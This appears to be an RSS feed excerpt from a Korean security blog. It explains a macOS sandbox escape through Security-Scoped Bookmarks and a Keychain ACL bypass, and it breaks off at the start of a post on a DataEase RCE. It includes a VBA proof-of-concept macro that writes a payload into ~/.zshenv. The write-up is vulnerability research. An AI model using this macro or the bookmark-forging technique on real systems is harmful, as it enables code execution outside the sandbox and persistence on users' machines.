&#xC720;&#xC9C0;</strong>&#xB41C;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC54C;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC989;, &#xC774; &#xC2B9;&#xC778; &#xC815;&#xBCF4;&#xB294; &#xC5B4;&#xB518;&#xAC00;&#xC5D0; <strong>&#xC601;&#xAD6C; &#xC800;&#xC7A5;</strong>&#xB418;&#xACE0; &#xC788;&#xACE0;, &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD558;&#xBA74; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xCD94;&#xAC00; &#xC2B9;&#xC778; &#xC5C6;&#xC774;&#xB3C4; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB97C; &#xBC97;&#xC5B4;&#xB09C; &#xD30C;&#xC77C; &#xC811;&#xADFC;&#xC774; &#xAC00;&#xB2A5;&#xD574;&#xC9C0;&#xB294; &#xAC83;&#xC774;&#xC8E0;..!!</p><p>&#xC774;&#xB97C; &#xD1A0;&#xB300;&#xB85C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB97C; &#xC138;&#xC6CC;&#xBCFC; &#xC218; &#xC788;&#xC5C8;&#xB294;&#xB370;&#xC694;. </p><ol><li>&#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xD30C;&#xC77C;&#xC744; &#xC120;&#xD0DD;&#xD558;&#xC5EC; &#xC811;&#xADFC; &#xAD8C;&#xD55C; &#xBD80;&#xC5EC;</li><li>&#xC774; &#xAD8C;&#xD55C;&#xC740; Security&#x2011;Scoped Bookmark &#xD615;&#xD0DC;&#xB85C; &#xC800;&#xC7A5;</li><li>&#xC545;&#xC131; &#xB9E4;&#xD06C;&#xB85C;&#xB294; &#xC774; bookmark&#xB97C; &#xC545;&#xC6A9;&#xD558;&#xC5EC; &#xC544;&#xBB34;&#xB7F0; &#xCD94;&#xAC00; &#xC2B9;&#xC778;&#xC744; &#xBC1B;&#xC9C0; &#xC54A;&#xACE0; &#xD2B9;&#xC815; &#xD30C;&#xC77C;&#xC5D0; &#xC811;&#xADFC;</li><li>&#xC608;&#xB97C; &#xB4E4;&#xC5B4; <code>~/.zshenv</code> &#xAC19;&#xC740; &#xCD08;&#xAE30; &#xC2E4;&#xD589; &#xD30C;&#xC77C; &#xC870;&#xC791; &#x2192; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC678;&#xBD80;&#xC5D0;&#xC11C; &#xBA85;&#xB839; &#xC2E4;&#xD589; &#xAC00;&#xB2A5;</li></ol><blockquote><p><strong>&#xB9E4;&#xD06C;&#xB85C;&#xB97C; &#xD1B5;&#xD55C; SSB &#xC545;&#xC6A9;</strong></p></blockquote><p>&#xC704; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB97C; &#xD1A0;&#xB300;&#xB85C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xD14C;&#xC2A4;&#xD2B8;&#xD574;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>Excel &#xB610;&#xB294; Word &#xC2E4;&#xD589; &#xD6C4; &#xC0C8; &#xBB38;&#xC11C; &#xC5F4;&#xAE30;</li><li>&#xB2E8;&#xCD95;&#xD0A4; <code>Alt + F11</code> &#x2192; VBA &#xD3B8;&#xC9D1;&#xAE30; &#xC5F4;&#xAE30;</li><li>&#xC0C1;&#xB2E8; &#xBA54;&#xB274;&#xC5D0;&#xC11C; <code>Insert &gt; Module</code> &#xC120;&#xD0DD;</li><li>&#xCF54;&#xB4DC; &#xBD99;&#xC5EC;&#xB123;&#xACE0; &#xC2E4;&#xD589;        <pre><code class="hljs bash">Sub Poc_GrantAccess()    Dim scptPath As String    Dim fileAccessGranted As Boolean    Dim filePermissionCandidates    Dim payload As String    <span class="hljs-string">&apos; Set the payload</span><span class="hljs-string">    payload = &quot;echo pwn&quot;</span><span class="hljs-string"></span><span class="hljs-string">    &apos;</span> Grant file permissions    scptPath = <span class="hljs-string">&quot;/Users/&quot;</span> &amp; Environ(<span class="hljs-string">&quot;USER&quot;</span>) &amp; <span class="hljs-string">&quot;/.zshenv&quot;</span>    filePermissionCandidates = Array(scptPath)    fileAccessGranted = GrantAccessToMultipleFiles(filePermissionCandidates)    <span class="hljs-string">&apos; Create an Application Script</span><span class="hljs-string">    Open scptPath For Output As #1</span><span class="hljs-string">    Print #1, payload</span><span class="hljs-string">    Close #1</span><span class="hljs-string">End Sub</span><span class="hljs-string"></span></code></pre></li></ol><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/image10.png" alt="image.png"></p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/image11.png" alt="image.png"></p><p>&#xC774;&#xCC98;&#xB7FC; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC2B9;&#xC778; &#xC815;&#xBCF4;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C4; SSB&#xAC00; &#xC545;&#xC6A9;&#xB418;&#xBA74;, &#xADF8; &#xC774;&#xD6C4;&#xC758; &#xC811;&#xADFC;&#xC740; <strong>&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC815;&#xCC45;&#xC758; &#xBCF4;&#xD638;&#xB97C; &#xC6B0;&#xD68C;</strong>&#xD558;&#xB294; &#xACBD;&#xB85C;&#xB85C; &#xC791;&#xB3D9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/image12.png" alt="image.png"></p><p>echo pwn &#xC774; &#xC798; &#xC2E4;&#xD589;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><strong>SSB &#xC800;&#xC7A5; &#xC704;&#xCE58; &#xBC0F; &#xAD6C;&#xC870; &#xBD84;&#xC11D;</strong></p><p>&#xC774; Bookmark&#xAC00; &#xC5B4;&#xB514;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xBCF8; &#xACB0;&#xACFC;, &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC120;&#xD0DD;(&#xD30C;&#xC77C; &#xC811;&#xADFC; &#xC2B9;&#xC778; &#xC5EC;&#xBD80;)&#xC744; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xB370;&#xC774;&#xD130;&#xB294; <strong>Containers &#xB514;&#xB809;&#xD1A0;&#xB9AC; &#xB0B4;&#xBD80;&#xC758; PLIST &#xD30C;&#xC77C;</strong>&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xACE0; &#xC788;&#xC5C8;&#xC5B4;&#xC694;. </p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/image13.png" alt="image.png"></p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/image14.png" alt="image.png"></p><p>&#xC774; <code>Containers</code> &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB294; App Sandbox&#xC758; &#xC81C;&#xC57D;&#xC744; &#xBC1B;&#xC9C0; &#xC54A;&#xB294; &#xD2B9;&#xC218;&#xD55C; &#xC704;&#xCE58;&#xB77C;&#xC11C;, &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB41C; &#xC571;&#xC774;&#xB77C;&#xB3C4; &#xC774; &#xB514;&#xB809;&#xD1A0;&#xB9AC; &#xC548;&#xC758; &#xD30C;&#xC77C;&#xC5D0;&#xB294; <strong>&#xC790;&#xC720;&#xB86D;&#xAC8C; &#xC811;&#xADFC;</strong>&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC545;&#xC131; &#xC571;&#xC774; &#xC774; PLIST &#xD30C;&#xC77C;&#xC744; &#xC870;&#xC791;&#xD558;&#xC5EC; SSB&#xB97C; &#xC778;&#xC704;&#xC801;&#xC73C;&#xB85C; &#xC0BD;&#xC785;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xBA74;, &#xBCC4;&#xB3C4;&#xC758; &#xC0AC;&#xC6A9;&#xC790; &#xC2B9;&#xC778; &#xC5C6;&#xC774; &#xC784;&#xC758;&#xC758; &#xD30C;&#xC77C; &#xC811;&#xADFC; &#xAD8C;&#xD55C;&#xC744; &#xD0C8;&#xCDE8;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xC758;&#xBBF8;&#xC8E0;! </p><p>&#xD558;&#xC9C0;&#xB9CC;.. &#xC774; PLIST &#xD30C;&#xC77C;&#xC740; &#xB2E8;&#xC21C;&#xD55C; &#xD14D;&#xC2A4;&#xD2B8;&#xAC00; &#xC544;&#xB2CC; <strong>&#xC11C;&#xBA85;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xD615;&#xC2DD;</strong>&#xC73C;&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xC5B4; &#xC788;&#xC5B4;&#xC694;. &#xB530;&#xB77C;&#xC11C; &#xBB34;&#xC791;&#xC815; &#xAC12;&#xC744; &#xB36E;&#xC5B4;&#xC4F0;&#xAC70;&#xB098; entry&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xAC74; &#xC27D;&#xC9C0;&#xC54A;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026;</p><blockquote><p><strong>ScopedBookmarkAgent &#xBD84;&#xC11D;</strong></p></blockquote><p>&#xC774; &#xB3D9;&#xC791; &#xBC29;&#xC2DD;&#xC744; &#xC880; &#xB354; &#xAE4A;&#xC774; &#xC774;&#xD574;&#xD558;&#xAE30; &#xC704;&#xD574; macOS&#xC758; &#xAD00;&#xB828; &#xBAA8;&#xB4C8;&#xB4E4;&#xC744; &#xB9AC;&#xBC84;&#xC2F1;&#xD558;&#xBA70; &#xAD6C;&#xC870;&#xB97C; &#xBD84;&#xC11D;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB41C; &#xC571;&#xC740; &#xC0AC;&#xC6A9;&#xC790;&#xB85C;&#xBD80;&#xD130; Open dialog&#xB97C; &#xD1B5;&#xD574; &#xD30C;&#xC77C; &#xC811;&#xADFC; &#xC2B9;&#xC778;&#xC744; &#xBC1B;&#xC544;&#xC57C;&#xB9CC; &#xC678;&#xBD80; &#xD30C;&#xC77C;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;. &#xC774; Open dialog&#xB294; <code>com.apple.appkit.xpc.openAndSavePanelService.xpc</code>&#xB77C;&#xB294; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC678;&#xBD80; &#xC11C;&#xBE44;&#xC2A4;&#xAC00; &#xB2F4;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xD30C;&#xC77C;&#xC744; &#xC120;&#xD0DD;&#xD558;&#xBA74;, &#xC774; &#xC11C;&#xBE44;&#xC2A4;&#xB294; &#xC120;&#xD0DD;&#xB41C; &#xD30C;&#xC77C;&#xC5D0; &#xB300;&#xD55C; &#xC811;&#xADFC; &#xAD8C;&#xD55C;&#xC744; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xD655;&#xC7A5;(Sandbox Extension) &#xD615;&#xD0DC;&#xB85C; &#xC571;&#xC5D0;&#xAC8C; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xD655;&#xC7A5;&#xC740; &#xCEE4;&#xB110;&#xC5D0;&#xC11C; &#xC0DD;&#xC131;&#xB418;&#xC5B4; <code>HMAC-SHA256</code>&#xC73C;&#xB85C; &#xC11C;&#xBA85;&#xB41C; &#xD1A0;&#xD070;&#xC774;&#xBA70; &#xC2E4;&#xC81C; &#xD30C;&#xC77C; &#xACBD;&#xB85C;, &#xAD8C;&#xD55C; &#xC815;&#xBCF4;(<code>com.apple.app-sandbox.read-write</code> &#xB4F1;), &#xD30C;&#xC77C; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130; &#xB4F1;&#xC774; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC5B4;&#xC694;. &#xC774; &#xD655;&#xC7A5;&#xC744; &#xBC1B;&#xC740; &#xC571;&#xC740; <code>libsystem_sandbox.dylib</code> &#xD558;&#xC704; API&#xB97C; &#xD1B5;&#xD574; &#xD30C;&#xC77C;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. </p><p>&#xD558;&#xC9C0;&#xB9CC; &#xC774; &#xD655;&#xC7A5; &#xD1A0;&#xD070;&#xC740; <strong>&#xC7AC;&#xBD80;&#xD305; &#xC2DC;&#xB9C8;&#xB2E4; &#xBB34;&#xD6A8;&#xD654;</strong>&#xB41C;&#xB2E4;&#xB294; &#xC81C;&#xC57D;&#xC774; &#xC788;&#xC5C8;&#xC8E0;.</p><p>&#xC774;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574; Apple&#xC740; &#xC0C8;&#xB85C;&#xC6B4; &#xBE44;&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC778; <strong>ScopedBookmarkAgent</strong>&#xB97C; &#xB3C4;&#xC785;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; Agent&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xB450; &#xAC00;&#xC9C0; &#xC5ED;&#xD560;&#xC744; &#xC218;&#xD589;&#xD574;&#xC694;.</p><ol><li>&#xBC1B;&#xC740; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xD655;&#xC7A5;&#xC744; &#xAC80;&#xC99D; &#xD6C4;, &#xC7A5;&#xAE30; &#xBCF4;&#xAD00; &#xAC00;&#xB2A5;&#xD55C; Bookmark &#xAC1D;&#xCCB4;&#xB85C; &#xBCC0;&#xD658;</li><li>&#xC800;&#xC7A5;&#xB41C; Bookmark &#xB370;&#xC774;&#xD130;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C;, &#xC0C8;&#xB85C;&#xC6B4; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xD655;&#xC7A5; &#xD1A0;&#xD070;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xC5EC; &#xC804;&#xB2EC;</li></ol><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4; Microsoft Office &#xAC19;&#xC740; &#xC571;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xD750;&#xB984;&#xC73C;&#xB85C; SSB&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;!</p><ul><li>&#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xD30C;&#xC77C; &#xC811;&#xADFC;&#xC744; &#xC2B9;&#xC778; &#x2192; <code>securebookmarks.plist</code>&#xC5D0; bookmark &#xC800;&#xC7A5;</li><li>&#xC774;&#xD6C4; &#xB3D9;&#xC77C;&#xD55C; &#xD30C;&#xC77C; &#xC811;&#xADFC; &#xC2DC; &#x2192; ScopedBookmarkAgent&#xB97C; &#xD1B5;&#xD574; bookmark &#x2192; &#xC0C8;&#xB85C;&#xC6B4; &#xD655;&#xC7A5; &#xD1A0;&#xD070; &#xC0DD;&#xC131;</li></ul><p>&#xC774; bookmark &#xAC1D;&#xCCB4; &#xC5ED;&#xC2DC; HMAC-SHA256&#xC73C;&#xB85C; &#xC11C;&#xBA85;&#xB418;&#xC5B4; &#xC788;&#xB294;&#xB370;, &#xC774;&#xB54C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xD0A4;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xACC4;&#xC0B0;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs ini"><span class="hljs-attr">cryptoKey</span> = HMAC-SHA256(secret, <span class="hljs-string">&quot;[bundle-id]&quot;</span>)</code></pre><p>&#xC774;&#xB54C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; <code>secret</code>&#xC740; <strong>macOS Keychain</strong>&#xC758; <code>com.apple.scopedbookmarksagent.xpc</code> &#xD56D;&#xBAA9;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xC5B4;&#xC11C;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC784;&#xC758;&#xB85C; bookmark&#xB97C; &#xC11C;&#xBA85;&#xD558;&#xAC70;&#xB098; &#xC870;&#xC791;&#xD558;&#xB294; &#xAC74; &#xB9E4;&#xC6B0; &#xC5B4;&#xB835;&#xAC8C; &#xC124;&#xACC4;&#xB418;&#xC5B4; &#xC788;&#xC5B4;&#xC694;.. &#xACB0;&#xAD6D; &#xACF5;&#xACA9;&#xC790;&#xAC00; sandbox escape&#xB97C; &#xC704;&#xD574; bookmark&#xB97C; &#xC704;&#xC870;&#xD558;&#xB824;&#xBA74; <strong>ScopedBookmarkAgent&#xC758; &#xC11C;&#xBA85; &#xD0A4;&#xB97C; &#xD0C8;&#xCDE8;&#xD558;&#xAC70;&#xB098;</strong>, &#xC720;&#xD6A8;&#xD55C; bookmark&#xB97C; &#xC6B0;&#xD68C;&#xC801;&#xC73C;&#xB85C; &#xC0BD;&#xC785;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.. &#xC880; &#xBCF5;&#xC7A1;&#xD558;&#xC8E0;?</p><blockquote><p><strong>Keychain ACL &#xC6B0;&#xD68C;</strong></p></blockquote><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/image15.png" alt="image.png"></p><p>macOS&#xC5D0;&#xC11C; <strong>Keychain</strong>(&#xD0A4;&#xCCB4;&#xC778;)&#xC740; &#xC554;&#xD638;&#xB098; &#xC778;&#xC99D;&#xC11C;&#xB97C; &#xC548;&#xC804;&#xD558;&#xAC8C; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xACF5;&#xAC04;&#xC774;&#xC5D0;&#xC694;. Windows&#xC758; Credential Manager&#xC640; &#xC720;&#xC0AC;&#xD558;&#xB2E4;&#xACE0; &#xBCFC; &#xC218; &#xC788;&#xC5B4;&#xC694;.<br>&#xC774; Keychain&#xC758; &#xC911;&#xC694;&#xD55C; &#xD2B9;&#xC9D5;&#xC740;, <strong>&#xAC01; &#xD56D;&#xBAA9;&#xC5D0; &#xB300;&#xD574; &#xC811;&#xADFC; &#xAC00;&#xB2A5;&#xD55C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC9C0;&#xC815;&#xD558;&#xB294; ACL</strong>(Access Control List)&#xC774; &#xC788;&#xB2E4;&#xB294; &#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xAD00;&#xC2EC;&#xC788;&#xAC8C; &#xBCF8; &#xD0A4;&#xCCB4;&#xC778; &#xD56D;&#xBAA9;&#xC740; &#xBC14;&#xB85C; <code>com.apple.scopedbookmarksagent.xpc</code> &#xD56D;&#xBAA9;&#xC774;&#xC5C8;&#xACE0;, &#xC774; &#xD56D;&#xBAA9;&#xC740; &#xC624;&#xC9C1; <strong>ScopedBookmarkAgent</strong>&#xB9CC; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; ACL&#xC774; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xADF8;&#xB7F0;&#xB370;&#x2026;! &#xC774; ACL&#xC740; <strong>&#x2018;&#xC77D;&#xAE30;&#x2019; &#xAD8C;&#xD55C;&#xB9CC; &#xC81C;&#xC5B4;</strong>&#xD55C;&#xB2E4;&#xB294; &#xC0AC;&#xC2E4;&#xC744; &#xBC1C;&#xACAC;&#xD588;&#xC5B4;&#xC694;.</p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/image16.png" alt="image.png"></p><p>&#xC989;, &#xAE30;&#xC874; &#xD56D;&#xBAA9;&#xC744; <strong>&#xC0AD;&#xC81C;&#xD558;&#xACE0;</strong>, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xB9CC;&#xB4E0; <strong>&#xC0C8; &#xD56D;&#xBAA9;&#xC744; &#xAC19;&#xC740; &#xC774;&#xB984;&#xC73C;&#xB85C; &#xB4F1;&#xB85D;</strong>&#xD558;&#xB294; &#xAC74; &#xAC00;&#xB2A5;&#xD588;&#xB358; &#xAC70;&#xC608;&#xC694;!</p><p>&#xC2EC;&#xC9C0;&#xC5B4; &#xC0C8; &#xD56D;&#xBAA9;&#xC5D0; &#xB300;&#xD55C; <strong>ACL&#xB3C4; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC9C1;&#xC811; &#xC124;&#xC815;</strong>&#xD560; &#xC218; &#xC788;&#xC5C8;&#xACE0;, ScopedBookmarkAgent&#xAC00; &#xC790;&#xC720;&#xB86D;&#xAC8C; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xAD6C;&#xC131;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xC5C8;&#xC5B4;&#xC694;.</p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/image17.png" alt="image.png"></p><p>&#xC774;&#xB807;&#xAC8C; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD1B5;&#xD574; &#xD655;&#xC778;&#xD574;&#xBCFC; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xACE0;&#xC815;&#xB41C; secret &#xAC12;&#xC744; &#xAC16;&#xB294; &#xC0C8;&#xB85C;&#xC6B4; &#xD56D;&#xBAA9;&#xC744; &#xB9CC;&#xB4E4;&#xC5B4;&#xB450;&#xBA74;, ScopedBookmarkAgent&#xB294; &#xC544;&#xBB34;&#xB7F0; &#xC758;&#xC2EC; &#xC5C6;&#xC774; &#xADF8; &#xD0A4;&#xB97C; &#xBC1B;&#xC544;&#xB4E4;&#xC5EC; &#xC11C;&#xBA85; &#xAC80;&#xC99D;&#xC5D0; &#xC0AC;&#xC6A9;&#xD558;&#xAC8C; &#xB418;&#xB294; &#xAC70;&#xC8E0;.</p><p>&#xC704; &#xB0B4;&#xC6A9;&#xC744; &#xD1A0;&#xB300;&#xB85C; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xD0A4;&#xCCB4;&#xC778;&#xC758; ACL &#xAD6C;&#xC870;&#xC640; &#xC11C;&#xBA85; &#xD0A4; &#xD30C;&#xC0DD; &#xAD6C;&#xC870;&#xB97C; &#xC545;&#xC6A9;&#xD558;&#xC5EC;, <strong>&#xC784;&#xC758;&#xC758; SSB&#xB97C; &#xC870;&#xC791;&#xB7;&#xC11C;&#xBA85;&#xD558;&#xACE0;</strong>, &#xC774;&#xB97C; &#xD1B5;&#xD574; <strong>&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC6B0;&#xD68C; &#xACBD;&#xB85C;&#xB97C; &#xD655;&#xBCF4;</strong>&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; SSB&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xBAA8;&#xB4E0; macOS &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC571;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xC904; &#xC218; &#xC788;&#xC73C;&#xBA70;, &#xB2E8;&#xC77C; &#xC571;&#xC5D0; &#xAD6D;&#xD55C;&#xB418;&#xC9C0; &#xC54A;&#xB294; &#xBC94;&#xC6A9;  macOS Sandbox Escape &#xAE30;&#xBC95;&#xC73C;&#xB85C; &#xC545;&#xC6A9;&#xB420; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xC810;&#xC5D0;&#xC11C; &#xAD49;&#xC7A5;&#xD788; &#xC704;&#xD5D8;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;..&#x314E;&#x314E;</p><p>&#xC774;&#xBC88; &#xAE00;&#xC5D0;&#xC11C; Sandbox Escape&#xC5D0; &#xB300;&#xD574; &#xACF5;&#xBD80;&#xD574;&#xBD24;&#xB294;&#xB370;&#xC694;! &#xC7AC;&#xBC0C;&#xB124;&#xC694;&#x2026; </p><p>&#xB2E4;&#xC74C;&#xBC88;&#xC5D0;&#xB3C4; &#xC7AC;&#xBC0C;&#xAC8C; &#xACF5;&#xBD80;&#xD574;&#xC624;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;~ &#xCC21;&#xAE0B;</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://support.apple.com/en-us/122375">https://support.apple.com/en-us/122375</a></p><p><a href="https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/">https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/</a></p><p><a href="https://www.microsoft.com/en-us/security/blog/2022/07/13/uncovering-a-macos-app-sandbox-escape-vulnerability-a-deep-dive-into-cve-2022-26706/">https://www.microsoft.com/en-us/security/blog/2022/07/13/uncovering-a-macos-app-sandbox-escape-vulnerability-a-deep-dive-into-cve-2022-26706/</a></p><p><a href="https://objectivebythesea.org/v4/talks/OBTS_v4_rWaisberg.pdf">https://objectivebythesea.org/v4/talks/OBTS_v4_rWaisberg.pdf</a></p><p><a href="https://github.com/yo-yo-yo-jbo/macos_app_structure">https://github.com/yo-yo-yo-jbo/macos_app_structure</a></p><p><a href="https://wojciechregula.blog/post/macos-sandbox-escape-via-terminal/">https://wojciechregula.blog/post/macos-sandbox-escape-via-terminal/</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/clalxk/">clalxk</category>
      
      <category domain="https://hackyboiz.github.io/tags/MacOS/">MacOS</category>
      
      <category domain="https://hackyboiz.github.io/tags/Sandbox-Escape/">Sandbox Escape</category>
      
      
      <comments>https://hackyboiz.github.io/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-53004 : DataEase의 JDBC 연결 매개변수 우회로 인한 RCE 취약점</title>
      <link>https://hackyboiz.github.io/2025/08/06/newp1ayer48/CVE-2025-53004/</link>
      <guid>https://hackyboiz.github.io/2025/08/06/newp1ayer48/CVE-2025-53004/</guid>
      <pubDate>Wed, 06 Aug 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/dataease/dataease/security/advis</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://github.com/dataease/dataease/security/advisories/GHSA-mfg2-qr5c-99pp">https://github.com/dataease/dataease/security/advisories/GHSA-mfg2-qr5c-99pp</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>io.dataease &lt;= 2.10.10</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>DataEase&#xB294; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xBE44;&#xC988;&#xB2C8;&#xC2A4; &#xC778;&#xD154;&#xB9AC;&#xC804;&#xC2A4; &#xBC0F; &#xB370;&#xC774;&#xD130; &#xC2DC;&#xAC01;&#xD654; &#xB3C4;&#xAD6C;&#xC785;&#xB2C8;&#xB2E4;. &#xB0B4;&#xBD80; Redshift &#xB370;&#xC774;&#xD130; &#xC18C;&#xC2A4; JDBC &#xC5F0;&#xACB0; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xC5D0; &#xC6B0;&#xD68C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC5EC;, &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC785;&#xB825;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xB294; RCE &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; <code>H2.java</code> &#xB0B4;&#xC758; &#xD638;&#xC2A4;&#xD2B8; &#xC774;&#xB984;/IP &#xC8FC;&#xC18C; &#xD544;&#xB4DC;&#xB97C; &#xC785;&#xB825; &#xBC1B;&#xB294; &#xBD80;&#xBD84;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; <code>jdbc</code> 